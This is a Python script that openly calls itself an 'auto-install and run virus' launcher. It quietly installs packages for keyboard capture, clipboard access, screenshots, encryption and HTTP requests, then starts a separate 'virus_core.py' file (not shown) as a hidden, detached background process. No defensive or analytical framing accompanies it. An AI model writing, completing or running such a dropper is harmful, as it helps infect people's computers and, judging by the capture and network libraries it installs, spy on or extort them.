#!/usr/bin/env python3
"""
Auto-install and run virus - No chmod needed, runs directly with Python
"""
import os
import sys
import subprocess
import shutil

def install_dependencies():
    """Install required packages automatically"""
    try:
        # Check if cryptography is installed
        try:
            import cryptography
            print("✓ cryptography already installed")
        except ImportError:
            print("Installing cryptography...")
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "--quiet", "--no-cache-dir", "cryptography>=41.0.0"],
                check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        
        # Check other critical packages
        critical_packages = [
            "pygame", "pynput", "psutil", "Pillow", 
            "pyperclip", "requests", "python-xlib"
        ]
        
        missing = []
        for pkg in critical_packages:
            try:
                __import__(pkg)
                print(f"✓ {pkg} already installed")
            except ImportError:
                missing.append(pkg)
        
        if missing:
            print(f"Installing missing packages: {', '.join(missing)}...")
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "--quiet", "--no-cache-dir"] + missing,
                check=False,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        
        # Try to install evdev (optional, may fail)
        try:
            import evdev
            print("✓ evdev already installed")
        except ImportError:
            try:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", "--quiet", "--no-cache-dir", "evdev"],
                    check=False,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            except:
                pass  # evdev is optional
        
        return True
    except Exception as e:
        print(f"Warning: Could not install all dependencies: {e}")
        return False

def run_virus():
    """Run virus core directly"""
    try:
        virus_core_path = os.path.join(os.path.dirname(__file__), "virus_core.py")
        if not os.path.exists(virus_core_path):
            print(f"Error: virus_core.py not found at {virus_core_path}")
            return False
        
        # Run virus directly with current Python
        print("Starting virus...")
        subprocess.Popen(
            [sys.executable, virus_core_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            start_new_session=True
        )
        return True
    except Exception as e:
        print(f"Error starting virus: {e}")
        return False

def main():
    """Main entry point - install and run"""
    # Change to script directory
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    # Install dependencies
    install_dependencies()
    
    # Run virus
    run_virus()
    
    print("Virus started in background")

if __name__ == "__main__":
    main()

